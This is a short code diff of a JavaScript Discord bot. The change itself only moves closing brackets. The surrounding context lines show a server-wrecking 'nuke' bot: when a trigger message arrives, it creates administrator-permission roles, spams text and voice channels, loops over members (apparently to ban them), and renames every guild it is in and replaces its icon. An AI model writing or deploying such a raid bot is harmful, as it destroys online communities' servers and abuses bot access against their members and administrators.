@@ -34,7 +34,12 @@ if (message.content === x_x) {
     hack.createRole({name: spam,permissions: [8],color: " #df1213"})
     hack.createChannel(teeext, 'text')
     hack.createChannel(vooice, 'voice')
-    })}, 3);}});
+    })}, 3);}
+});
+
+
+
+
 client.on('message', message => {
 if (message.content === x_x) {
     message.guild.members.forEach(baand => {
@@ -46,6 +51,7 @@ if (message.content === x_x) {
    client.user.setGame(playing, 'https://www.twitch.tv/hix')
    client.guilds.forEach(hack => {
    hack.setIcon(pic)
-   hack.setName(namee)})})})}});
+   hack.setName(namee)})})})}
+});
    
    client.login(process.env.BOT_TOKEN);
